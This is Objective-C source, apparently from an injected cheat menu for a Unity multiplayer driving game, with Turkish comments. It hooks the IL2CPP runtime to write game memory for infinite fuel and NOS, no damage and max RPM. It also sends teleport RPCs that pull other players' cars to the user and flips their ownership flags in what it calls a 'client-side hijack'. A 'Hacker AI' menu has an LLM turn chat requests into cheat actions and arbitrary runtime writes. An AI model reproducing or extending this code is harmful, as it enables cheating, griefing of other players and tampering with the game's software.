- (void)tapAsciiColor { asciiColorCycle = !asciiColorCycle; saveBool(@"asciiColor", asciiColorCycle); [self refreshUI]; }

- (void)tapAsciiAnim {
    isAsciiAnimEnabled = !isAsciiAnimEnabled;
    saveBool(@"asciianim", isAsciiAnimEnabled);
    if (asciiTimer) { [asciiTimer invalidate]; asciiTimer = nil; }
    if (isAsciiAnimEnabled) {
        asciiFrameIdx = 0;
        asciiTimer = [NSTimer scheduledTimerWithTimeInterval:0.4 target:self selector:@selector(fireAscii) userInfo:nil repeats:YES];
    }
    [self refreshUI];
}

- (void)pickAsciiAnim:(UIButton*)b {
    asciiAnimIndex = (asciiAnimIndex + 1) % (int)asciiAnims().count;
    asciiFrameIdx = 0;
    saveInt(@"asciiIdx", asciiAnimIndex);
    [b setTitle:[NSString stringWithFormat:@"\U0001F3AC Animasyon Sec (%d/%d)", asciiAnimIndex + 1, (int)asciiAnims().count] forState:UIControlStateNormal];
}

// ===== GIF -> ASCII: menuden GIF/resim sec, chate ASCII olarak oynat =====
- (void)pickGifForAscii {
    @try {
        UIViewController *top = few1n_topVC();
        if (!top) { FLog(@"Ekran bulunamadi - menuyu kapatip tekrar dene"); return; }
        if (@available(iOS 14.0, *)) {
            PHPickerConfiguration *cfg = [[PHPickerConfiguration alloc] init];
            cfg.selectionLimit = 1;
            cfg.filter = [PHPickerFilter imagesFilter];
            PHPickerViewController *pk = [[PHPickerViewController alloc] initWithConfiguration:cfg];
            pk.delegate = self;
            [top presentViewController:pk animated:YES completion:nil];
            FLog(@"GIF veya resim sec...");
        } else {
            UIImagePickerController *ipc = [[UIImagePickerController alloc] init];
            ipc.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
            ipc.delegate = self;
            [top presentViewController:ipc animated:YES completion:nil];
        }
    } @catch (NSException *e) { FLog([NSString stringWithFormat:@"GIF secici hata: %@", e.reason]); }
}

// PHPicker sonucu (iOS 14+)
- (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results API_AVAILABLE(ios(14.0)) {
    [picker dismissViewControllerAnimated:YES completion:nil];
    if (results.count == 0) { FLog(@"Secim iptal"); return; }
    NSItemProvider *ip = results.firstObject.itemProvider;
    // 1) GIF'in HAM verisini al (animasyon korunur). Once com.compuserve.gif, sonra "gif" iceren her tipi dene.
    NSString *gifType = nil;
    if ([ip hasItemConformingToTypeIdentifier:@"com.compuserve.gif"]) gifType = @"com.compuserve.gif";
    else {
        for (NSString *tid in ip.registeredTypeIdentifiers) {
            if ([tid.lowercaseString containsString:@"gif"]) { gifType = tid; break; }
        }
    }
    if (gifType) {
        [ip loadDataRepresentationForTypeIdentifier:gifType completionHandler:^(NSData *data, NSError *error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                if (data.length > 0) [self buildGifAsciiFromData:data];
                else FLog(@"GIF verisi okunamadi");
            });
        }];
        return;
    }
    // 2) Statik resim (tek kare)
    if ([ip canLoadObjectOfClass:[UIImage class]]) {
        [ip loadObjectOfClass:[UIImage class] completionHandler:^(__kindof id<NSItemProviderReading> obj, NSError *error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                UIImage *img = [obj isKindOfClass:[UIImage class]] ? (UIImage*)obj : nil;
                NSData *d = img ? UIImagePNGRepresentation(img) : nil;
                if (d.length > 0) [self buildGifAsciiFromData:d];
                else FLog(@"Resim okunamadi");
            });
        }];
    } else {
        FLog(@"Desteklenmeyen dosya turu");
    }
}

// Eski iOS icin UIImagePicker sonucu
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary<UIImagePickerControllerInfoKey,id> *)info {
    [picker dismissViewControllerAnimated:YES completion:nil];
    @try {
        NSURL *url = info[UIImagePickerControllerImageURL];
        NSData *data = url ? [NSData dataWithContentsOfURL:url] : nil;
        if (!data.length) {
            UIImage *img = info[UIImagePickerControllerOriginalImage];
            if (img) data = UIImagePNGRepresentation(img);
        }
        if (data.length > 0) [self buildGifAsciiFromData:data];
        else FLog(@"Resim okunamadi");
    } @catch (...) {}
}
- (void)imagePickerControllerDidCancel:(UIImagePickerController *)picker {
    [picker dismissViewControllerAnimated:YES completion:nil];
    FLog(@"Secim iptal");
}

- (void)playGifAscii {
    FLog(@"GIF Oynat/Durdur tetiklendi");
}

- (void)buildGifAsciiFromData:(NSData*)data {
    if (!data.length) return;
    FLog([NSString stringWithFormat:@"GIF Verisi İşleniyor: %lu bayt", (unsigned long)data.length]);
}

- (void)applyBrakeGlowOld_UNUSED { }

// v114.4 TEMIZ: SADECE Method 6 (WheelCollider slip = MAX, senin ipucu)
// Init'te class + field offsetleri BIR KEZ resolve, safe try/catch, ultra null check.
// BALATA TEST MODU (UnityFramework binary MAKINE KODU ile dogrulandi):
// RCCP_WheelGlow.dob(float a) @ RVA 0x59EB634 disassemble edildi. Yaptigi:
//   t = clamp01((a - minVisibleTemperature) / (maxTemperature - minVisibleTemperature));
//   Color c = hxk.Evaluate(t);  float ints = hxl.Evaluate(t);  hxm.SetColor(nameID, c * ints);
// => 'a' SICAKLIKTIR; renk VE yogunluk normalize t'den gelir (ham temp DEGIL). Bu yuzden _hxg/slip
//    yazmak gereksizdir -> silindi. Iki kaldirac ayri ayri denenebilir:
//   (1) minVisibleTemperature = -100000  -> oyunun kendi her-frame dob cagrilari da t~=1 verir (kalici sicak).
//   (2) oyunun kendi dob(1e9) metodunu biz cagiririz -> t clamp 1 -> en sicak renk aninda (oyun idle olsa bile).
// Dob'un tek float imzasi statik olarak dogrulandi. Runtime sonuc ve instance gecerliligi cihazda dogrulanmalidir.
// exc yalniz managed exception'i bildirir; native fault garantisi vermez. Asagidaki kontroller riski azaltir.
- (void)applyBrakeGlow {
    static bool g_bgInited = false;
    static void* g_wgClass = NULL;     // RCCP_WheelGlow Il2CppClass* (kimlik kontrolu icin)
    static void* g_wgType = NULL;      // typeof(RCCP_WheelGlow) - FindObjectsOfType icin
    static void* g_mDob = NULL;        // RCCP_WheelGlow.dob(float) MethodInfo
    static int g_offMinVisTemp = -1;   // minVisibleTemperature (dump 0x2C, isimle cozulur)
    if (!g_bgInited) {
        g_bgInited = true;
        @try {
            void* g = NULL;
            @try { g = few1n_classAnyImage("", "RCCP_WheelGlow"); } @catch (...) { g = NULL; }
            if (g) {
                g_wgClass = g;   // kimlik kontrolu: dob'u SADECE gercek WheelGlow instance'inda cagir
                @try { void* t = few1n_typeObjOf(g); if (ptrOk(t)) g_wgType = t; } @catch (...) {}
                @try { if (i_class_get_method_from_name) g_mDob = i_class_get_method_from_name(g, "dob", 1); } @catch (...) {}
                @try {
                    if (i_class_get_field_from_name && i_field_get_offset) {
                        void* f = i_class_get_field_from_name(g, "minVisibleTemperature");
                        if (f) g_offMinVisTemp = (int)i_field_get_offset(f);
                    }
                } @catch (...) {}
                FLog([NSString stringWithFormat:@"🔥 WheelGlow: type=%p dob=%p minVisTemp@%d", g_wgType, g_mDob, g_offMinVisTemp]);
            }
        } @catch (...) {}
    }
    if (!isBrakeGlowDobEnabled && !isBrakeGlowMinTempEnabled) return;
    if (!g_wgType || !g_mFindObjectsPlural || !i_runtime_invoke) return;
    @try {
        void* a1[1]; a1[0] = g_wgType;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a1, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 256) return;
        void** gs = (void**)((uintptr_t)arr + 0x20);
        float hot = 1000000000.0f;   // 1e9 -> dob icinde t clamp 1 (en sicak renk)
        for (int i = 0; i < cnt; i++) {
            void* wg = gs[i]; if (!ptrOk(wg) || !unityAlive(wg)) continue;
            // Kimlik kontrolu: wg gercekten RCCP_WheelGlow mu? (obj[0] = Il2CppClass*).
            // Bu ve unityAlive kontrolleri yanlis/stale this riskini azaltir; @try native SIGSEGV yakalamaz.
            @try { if (g_wgClass && *(void**)wg != g_wgClass) continue; } @catch (...) { continue; }
            // (1) Kalici-esik modu: oyunun kendi dob cagrilari da t~=1 versin.
            if (isBrakeGlowMinTempEnabled) {
                @try {
                    if (g_offMinVisTemp > 0x10 && g_offMinVisTemp < 0x400) *(float*)((uintptr_t)wg + g_offMinVisTemp) = -100000.0f;
                } @catch (...) {}
            }
            // (2) Anlik-sicaklik modu: oyunun dob(float) metodunu yuksek sicaklikla cagir.
            if (isBrakeGlowDobEnabled) {
                @try {
                    if (g_mDob) { void* exc = NULL; void* p[1]; p[0] = &hot; i_runtime_invoke(g_mDob, wg, p, &exc); }
                } @catch (...) {}
            }
        }
    } @catch (...) {}
}

- (void)restartBrakeGlowTimer {
    isBrakeGlowEnabled = isBrakeGlowDobEnabled || isBrakeGlowMinTempEnabled;
    if (brakeGlowTimer) { [brakeGlowTimer invalidate]; brakeGlowTimer = nil; }
    if (!isBrakeGlowEnabled) return;
    [self applyBrakeGlow];
    // Yeni arac/instance olusunca ayari tekrar uygula; her iki mod da ayni taramayi kullanir.
    brakeGlowTimer = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(applyBrakeGlow) userInfo:nil repeats:YES];
}

- (NSString*)brakeGlowModeDescription {
    if (isBrakeGlowDobEnabled && isBrakeGlowMinTempEnabled) return @"dob(1e9) + minVisibleTemperature";
    if (isBrakeGlowDobEnabled) return @"yalniz dob(1e9)";
    if (isBrakeGlowMinTempEnabled) return @"yalniz minVisibleTemperature";
    return @"kapali";
}

// Eski favori/selector yolu: iki deneyi birlikte acip kapatir.
- (void)tapBrakeGlow {
    BOOL enableBoth = !isBrakeGlowEnabled;
    isBrakeGlowDobEnabled = enableBoth;
    isBrakeGlowMinTempEnabled = enableBoth;
    saveBool(@"brakeglow", enableBoth);
    saveBool(@"brakeglowdob", enableBoth);
    saveBool(@"brakeglowmin", enableBoth);
    [self restartBrakeGlowTimer];
    FLog([NSString stringWithFormat:@"🔥 Balata test modu: %@", [self brakeGlowModeDescription]]);
    [self refreshUI];
}

- (void)tapBrakeGlowDob {
    isBrakeGlowDobEnabled = !isBrakeGlowDobEnabled;
    saveBool(@"brakeglowdob", isBrakeGlowDobEnabled);
    [self restartBrakeGlowTimer];
    FLog([NSString stringWithFormat:@"🔥 Balata test modu: %@", [self brakeGlowModeDescription]]);
    [self refreshUI];
}

- (void)tapBrakeGlowMinTemp {
    isBrakeGlowMinTempEnabled = !isBrakeGlowMinTempEnabled;
    saveBool(@"brakeglowmin", isBrakeGlowMinTempEnabled);
    [self restartBrakeGlowTimer];
    FLog([NSString stringWithFormat:@"🔥 Balata test modu: %@", [self brakeGlowModeDescription]]);
    [self refreshUI];
}
- (void)tapAlwaysLights {   // v97: GERI GELDI - RCCP_Lights offset 0x40/0x41 (Selektor ile ayni)
    isAlwaysLightsEnabled = !isAlwaysLightsEnabled;
    saveBool(@"alwayslights", isAlwaysLightsEnabled);
    [self refreshUI];
    if (isAlwaysLightsEnabled) {
        NSMutableString *diag = [NSMutableString stringWithString:@"💡 Farlar Surekli Acik AKTIF - "];
        if (!g_rccpLightsType)    [diag appendString:@"RCCP_Lights tipi YOK "];
        if (!g_mFindObjectsPlural)[diag appendString:@"FindObjects YOK "];
        if (g_rccpLightsType && g_mFindObjectsPlural)
            [diag appendString:@"HAZIR (arac spawn olunca farlar acilir)"];
        FLog(diag);
    } else {
        FLog(@"💡 Farlar Surekli Acik KAPALI");
    }
}
- (void)tapInfiniteFuel {
    FLog(@"⛽ Yakit toggle kaldirildi (v90)");
    [self refreshUI];
}
- (void)tapNoDamage {
    // v91: RCCP_Damage.Update hook aktif — toggle açıksa Update tamamen skip → hasar sistemi durur
    isNoDamageEnabled = !isNoDamageEnabled;
    saveBool(@"nodamage", isNoDamageEnabled);
    FLog(isNoDamageEnabled ? @"🛡️ Hasar Yok AKTİF (RCCP_Damage.Update skip)" : @"🛡️ Hasar Yok kapalı — normal hasar");
    [self refreshUI];
}

// v100: yeni gizli ozellik tap handler'lari
- (void)tapInfNos {
    isInfiniteNosEnabled = !isInfiniteNosEnabled;
    saveBool(@"infnos", isInfiniteNosEnabled);
    FLog(isInfiniteNosEnabled ? [NSString stringWithFormat:@"💨 SONSUZ NOS AKTIF (class=%p offset=%d)", g_rccpNosTypeObj, g_offNosAmount] : @"💨 NOS kapalı");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapInfFuel {
    isInfiniteFuelEnabled = !isInfiniteFuelEnabled;
    saveBool(@"inffuel", isInfiniteFuelEnabled);
    FLog(isInfiniteFuelEnabled ? [NSString stringWithFormat:@"⛽ SONSUZ YAKIT AKTIF (class=%p fill@%d)", g_rccpFuelTypeObj, g_offFuelFill] : @"⛽ Yakıt normal");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapMaxRpm {
    isMaxRpmEnabled = !isMaxRpmEnabled;
    saveBool(@"maxrpm", isMaxRpmEnabled);
    FLog(isMaxRpmEnabled ? [NSString stringWithFormat:@"🚀 MAX RPM AKTIF (class=%p override@%d rpm@%d)", g_rccpEngineTypeObj, g_offEngineOverride, g_offEngineRpm] : @"🚀 RPM normal");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapNoDamageV2 {
    isNoDamageV2Enabled = !isNoDamageV2Enabled;
    saveBool(@"nodamagev2", isNoDamageV2Enabled);
    FLog(isNoDamageV2Enabled ? [NSString stringWithFormat:@"🛡️ HASAR YOK V2 AKTIF (class=%p max@%d mult@%d)", g_rccpDamageTypeObj, g_offDamageMax, g_offDamageMult] : @"🛡️ Hasar V2 kapalı");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapImmortalEngine {
    isEngineImmortalEnabled = !isEngineImmortalEnabled;
    saveBool(@"immortalengine", isEngineImmortalEnabled);
    FLog(isEngineImmortalEnabled ? @"🔥 Motor Ölmez AKTIF (engineRunning=true her 1.5s)" : @"🔥 Motor normal");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapNoTraffic {
    isNoTrafficEnabled = !isNoTrafficEnabled;
    saveBool(@"notraffic", isNoTrafficEnabled);
    FLog(isNoTrafficEnabled ? [NSString stringWithFormat:@"🚗 TRAFİK DURSUN AKTIF (HR_TrafficCar class=%p)", g_hrTrafficCarTypeObj] : @"🚗 Trafik normal");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}

// v102 tap fonksiyonlari
- (void)tapEmissivePaint {
    isEmissivePaintEnabled = !isEmissivePaintEnabled;
    saveBool(@"emissive", isEmissivePaintEnabled);
    if (isEmissivePaintEnabled) { few1n_refreshCarMats(); FLog([NSString stringWithFormat:@"✨ Emissive Parlak Boya AKTIF (%d mat HDR sarı-turuncu)", g_carMatCount]); }
    else FLog(@"✨ Emissive kapali");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapExhaustFlame {
    isExhaustFlameOnEnabled = !isExhaustFlameOnEnabled;
    saveBool(@"exhaustflame", isExhaustFlameOnEnabled);
    FLog(isExhaustFlameOnEnabled ? [NSString stringWithFormat:@"🔥 Egzoz Alev Surekli AKTIF (class=%p offset=%d)", g_rccpExhaustTypeObj, g_offExhaustFlameCutoff] : @"🔥 Egzoz normal");
    [self startGizliTimerIfNeeded]; [self refreshUI];
}
- (void)tapDetachParts {
    // Anlik action: tum RCCP_DetachablePart'larin strength'ini 0 yap - herhangi bir vurma anında kopar
    if (!g_rccpDetachTypeObj || g_offDetachStrength <= 0) { FLog(@"🔧 DetachablePart class YOK"); return; }
    @try {
        void* a[1]; a[0] = g_rccpDetachTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) { FLog(@"🔧 Detach: obje yok"); return; }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 128) { FLog(@"🔧 Detach: sayı anormal"); return; }
        void** items = (void**)((uintptr_t)arr + 0x20);
        int changed = 0;
        for (int i = 0; i < cnt; i++) {
            void* it = items[i]; if (!unityAlive(it)) continue;
            *(float*)((uintptr_t)it + g_offDetachStrength) = 0.0f;
            if (g_offDetachIsDetachable > 0) *(bool*)((uintptr_t)it + g_offDetachIsDetachable) = true;
            changed++;
        }
        FLog([NSString stringWithFormat:@"🔧 %d parca strength=0 (ilk carpmada koparlar)", changed]);
        UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🔧 Parca Sok+Firlat" message:[NSString stringWithFormat:@"%d parca zayiflatildi. Simdi araba carparsa kapı/spoyler uçar.", changed] preferredStyle:UIAlertControllerStyleAlert];
        [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:r];
    } @catch (...) { FLog(@"🔧 Detach: exception"); }
}
- (void)tapTeleportAllToMe {
    // Herkesi bana teleport - yabanci araclarin Rigidbody pozisyonunu benim pozisyonuma set et
    if (!unityAlive(g_rb)) { FLog(@"🚀 TeleportAll: benim aracim YOK"); return; }
    if (!g_carPhotonSyncTypeObj || !cps_TeleportCar_RPC) { FLog(@"🚀 TeleportAll: CarPhotonSync/RPC YOK"); return; }
    @try {
        Vec3 myPos; rbGetPosIl(g_rb, &myPos);
        void* a[1]; a[0] = g_carPhotonSyncTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 32) return;
        void** items = (void**)((uintptr_t)arr + 0x20);
        int sent = 0;
        Quaternion q = {0, 0, 0, 1};
        for (int i = 0; i < cnt; i++) {
            void* cps = items[i]; if (!unityAlive(cps)) continue;
            // hedef pozisyon: kendi pozisyonumdan 3m ileri offset (uzak arac benim üstüme gelmesin diye)
            Vec3 target = { myPos.x + (float)(i-cnt/2)*2.5f, myPos.y + 1.0f, myPos.z + 3.0f };
            cps_TeleportCar_RPC(cps, target, q, NULL);
            sent++;
        }
        FLog([NSString stringWithFormat:@"🚀 %d araca teleport RPC gonderildi (%.1f, %.1f, %.1f)", sent, myPos.x, myPos.y, myPos.z]);
        UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🚀 Herkesi Sana Teleport" message:[NSString stringWithFormat:@"%d araca RPC gonderildi. Yaninda toplanmalilar.", sent] preferredStyle:UIAlertControllerStyleAlert];
        [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:r];
    } @catch (...) { FLog(@"🚀 TeleportAll: exception"); }
}
- (void)tapHijackCar {
    // Yabanci HR_PhotonSync'lerin isMine'ini true yap (client-side ownership)
    if (!g_hrPhotonSyncTypeObj || g_offPhotonIsMine <= 0) { FLog(@"🎮 Hijack: HR_PhotonSync/isMine YOK"); return; }
    @try {
        void* a[1]; a[0] = g_hrPhotonSyncTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 32) return;
        void** items = (void**)((uintptr_t)arr + 0x20);
        int changed = 0;
        for (int i = 0; i < cnt; i++) {
            void* it = items[i]; if (!unityAlive(it)) continue;
            *(bool*)((uintptr_t)it + g_offPhotonIsMine) = true;
            changed++;
        }
        FLog([NSString stringWithFormat:@"🎮 %d HR_PhotonSync isMine=true (client-side hijack)", changed]);
        UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🎮 Ele Geçir" message:[NSString stringWithFormat:@"%d aracın isMine=true set edildi. Sunucuda gerçek ownership değişmez ama yerel sync bozulur.", changed] preferredStyle:UIAlertControllerStyleAlert];
        [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:r];
    } @catch (...) { FLog(@"🎮 Hijack: exception"); }
}
- (void)tapVidyoNames {
    isVidyoNamesEnabled = !isVidyoNamesEnabled;
    saveBool(@"vidyonames", isVidyoNamesEnabled);
    FLog(isVidyoNamesEnabled ? @"📺 Vidyo İsim Modu AKTIF (TMP_Text hook next-tick)" : @"📺 Vidyo isim kapali");
    [self refreshUI];
}

// v105: Anlik oyuncu ID listesi
// v112: Hacker AI kullanim bilgisi
- (void)showHackerAiInfo {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🔓 HACKER AI + KEŞİF"
        message:@"3 chat komutu var:\n\n🔓 /hack <istek>\n  Doğal dilde hile iste. AI JSON action döner, mod tetikler.\n  Örn: /hack sonsuz gaz, /hack godmode aç, /hack herkesi bana teleport\n\n🔍 /scan <ClassName>\n  Runtime il2cpp'de class field'larını dump et. AI keşif için.\n  Örn: /scan RCCP_Turbo, /scan HR_TrafficCar, /scan RCCP_Engine\n\n✍️ /write Class.field type value\n  Class instance'larına direkt runtime yaz (bool/int/float/double).\n  Örn: /write RCCP_Nos.amount float 100\n  Örn: /write RCCP_Engine.overrideEngineRPM bool true\n\nAI kombine et: /scan RCCP_Turbo → görürsün → /write ile exploit et."
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
    [self present:ac];
}

// v114.4: AI cevap renklerini sec (isim + cevap ayri)
- (void)pickAiColorFor:(BOOL)forName {
    NSString *title = forName ? @"🎨 İsim Rengi Seç [FEW1N AI]" : @"🎨 Cevap Rengi Seç";
    NSString *curHex = [NSString stringWithUTF8String:forName ? g_aiNameColorHex : g_aiReplyColorHex];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:[NSString stringWithFormat:@"Aktif: #%@\n\nPreset veya hex yaz:", curHex] preferredStyle:UIAlertControllerStyleAlert];
    NSArray *presets = @[
        @[@"🔵 Cyan", @"00E5FF"], @[@"🟣 Magenta", @"FF00FF"], @[@"🔴 Kırmızı", @"FF0000"],
        @[@"🟢 Yeşil", @"00FF00"], @[@"🟡 Sarı", @"FFFF00"], @[@"🟠 Turuncu", @"FF8000"],
        @[@"💙 Mavi", @"0080FF"], @[@"⚪ Beyaz", @"FFFFFF"], @[@"💗 Pembe", @"FF66CC"],
        @[@"⚫ Altın", @"FFD700"]
    ];
    for (NSArray *p in presets) {
        NSString *label = p[0]; NSString *hex = p[1];
        [ac addAction:[UIAlertAction actionWithTitle:label style:UIAlertActionStyleDefault handler:^(UIAlertAction *aa){
            const char *cstr = hex.UTF8String;
            if (forName) strncpy(g_aiNameColorHex, cstr, 7);
            else         strncpy(g_aiReplyColorHex, cstr, 7);
            if (forName) g_aiNameColorHex[7] = '\0'; else g_aiReplyColorHex[7] = '\0';
            saveStr(forName ? @"aiNameCol" : @"aiReplyCol", hex);
            FLog([NSString stringWithFormat:@"🎨 %@ = #%@", forName ? @"AI Isim" : @"AI Cevap", hex]);
        }]];
    }
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"custom hex (FF00FF)"; tf.text = curHex; tf.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters; }];
    __weak UIAlertController *w = ac;
    [ac addAction:[UIAlertAction actionWithTitle:@"✅ Custom Hex Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aa){
        NSString *t = w.textFields.firstObject.text;
        if (t.length >= 3 && t.length <= 6) {
            if (forName) { strncpy(g_aiNameColorHex, t.UTF8String, 7); g_aiNameColorHex[7]='\0'; }
            else         { strncpy(g_aiReplyColorHex, t.UTF8String, 7); g_aiReplyColorHex[7]='\0'; }
            saveStr(forName ? @"aiNameCol" : @"aiReplyCol", t);
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)pickAiColors {
    UIAlertController *pick = [UIAlertController alertControllerWithTitle:@"🎨 AI Renkleri" message:@"Hangi rengi degistirmek istiyorsun?" preferredStyle:UIAlertControllerStyleAlert];
    [pick addAction:[UIAlertAction actionWithTitle:@"🏷 İsim Rengi [FEW1N AI]" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ [self pickAiColorFor:YES]; }]];
    [pick addAction:[UIAlertAction actionWithTitle:@"💬 Cevap Rengi" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ [self pickAiColorFor:NO]; }]];
    [pick addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:pick];
}

// v111: AI Sohbet Modu toggle
- (void)tapAiChatMode {
    isAiChatModeEnabled = !isAiChatModeEnabled;
    saveBool(@"aichat", isAiChatModeEnabled);
    FLog(isAiChatModeEnabled ? @"💬 AI Sohbet Modu AKTIF - AI/bot/Grok hitaplarina cevap verir" : @"💬 AI Sohbet kapali - sadece /ai <soru> komutu");
    [self refreshUI];
}

// AI bot kurulumu: provider, model ve provider'a ait API key ayri tutulur.
- (void)editAiApiKey {
    NSString *cur = few1n_groqApiKey();
    NSString *masked = cur.length > 12 ? [NSString stringWithFormat:@"%@...%@", [cur substringToIndex:8], [cur substringFromIndex:cur.length - 4]] : cur;
    NSString *hookState = o_chatSend ? @"hazir" : @"HAZIR DEGIL";
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🤖 Oyun Sohbeti AI"
        message:[NSString stringWithFormat:@"Kullanim: odada /ai <soru> yaz. Bot cevabi herkesin gorecegi chat mesaji olarak gonderir.\n\nProvider: %@\nModel: %@\nAPI key: %@\nChat hook: %@\n\nGrok icin önce Provider Sec > Grok, sonra kendi xAI API key'ini gir.", few1n_aiProviderName(), kGroqModel(), masked.length ? masked : @"ayarlanmamis", hookState]
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = few1n_isGrokProvider() ? @"xAI API key" : @"API key";
        tf.text = cur;
        tf.clearButtonMode = UITextFieldViewModeAlways;
        tf.autocapitalizationType = UITextAutocapitalizationTypeNone;
        tf.autocorrectionType = UITextAutocorrectionTypeNo;
    }];
    __weak UIAlertController *w = ac;
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *k = w.textFields.firstObject.text;
        if (k && k.length > 10) {
            [[NSUserDefaults standardUserDefaults] setObject:k forKey:few1n_aiKeyStorageKey()];
            g_groqApiKey = k;
            FLog([NSString stringWithFormat:@"🤖 %@ API key kaydedildi", few1n_aiProviderName()]);
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🌐 Provider Seç (Groq / Grok / Custom)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aa){
        UIAlertController *pp = [UIAlertController alertControllerWithTitle:@"🌐 API Provider" message:[NSString stringWithFormat:@"Aktif: %@\n\nDegistir:", kApiEndpoint()] preferredStyle:UIAlertControllerStyleAlert];
        [pp addAction:[UIAlertAction actionWithTitle:@"🆓 Groq (api.groq.com) - ucretsiz" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
            few1n_setAiProvider(kEndpointGroq, kGroqModelDefault);
            FLog(@"🌐 Provider: Groq. Groq API key girip Test Et'e bas.");
        }]];
        [pp addAction:[UIAlertAction actionWithTitle:@"💰 Grok (api.x.ai) - odemeli xAI" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
            few1n_setAiProvider(kEndpointGrok, kGrokModelDefault);
            FLog(@"🌐 Provider: Grok (xAI), model: grok-4.5. xAI API key girip Test Et'e bas.");
        }]];
        [pp addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"custom endpoint URL"; tf.text = kApiEndpoint(); tf.autocapitalizationType = UITextAutocapitalizationTypeNone; tf.autocorrectionType = UITextAutocorrectionTypeNo; }];
        __weak UIAlertController *wp = pp;
        [pp addAction:[UIAlertAction actionWithTitle:@"✅ Custom URL" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
            NSString *u = wp.textFields.firstObject.text;
            if (u.length > 10) {
                few1n_setAiProvider(u, nil);
                FLog([NSString stringWithFormat:@"🌐 Custom endpoint: %@", u]);
            }
        }]];
        [pp addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:pp];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🔧 Model Seç (preset veya custom)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aa){
        UIAlertController *mp = [UIAlertController alertControllerWithTitle:@"🔧 AI Model Seç" message:[NSString stringWithFormat:@"Aktif: %@ (%@)", kGroqModel(), few1n_aiProviderName()] preferredStyle:UIAlertControllerStyleAlert];
        NSArray *presets = @[
            @[@"💰 Grok 4.5 (xAI)", @"grok-4.5", kEndpointGrok],
            @[@"💰 Grok latest (xAI)", @"latest", kEndpointGrok],
            @[@"🆓 Llama 3.3 70B (Groq)", @"llama-3.3-70b-versatile", kEndpointGroq],
            @[@"🆓 GPT-OSS 20B (Groq)", @"openai/gpt-oss-20b", kEndpointGroq],
        ];
        for (NSArray *p in presets) {
            NSString *lbl = p[0]; NSString *mn = p[1]; NSString *endpoint = p[2];
            [mp addAction:[UIAlertAction actionWithTitle:lbl style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
                few1n_setAiProvider(endpoint, mn);
                FLog([NSString stringWithFormat:@"🔧 Provider: %@, model: %@", few1n_aiProviderName(), mn]);
            }]];
        }
        [mp addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"custom model adi (ornek: qwen/qwen3-32b)"; tf.autocapitalizationType = UITextAutocapitalizationTypeNone; tf.autocorrectionType = UITextAutocorrectionTypeNo; }];
        __weak UIAlertController *wm = mp;
        [mp addAction:[UIAlertAction actionWithTitle:@"✅ Custom Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
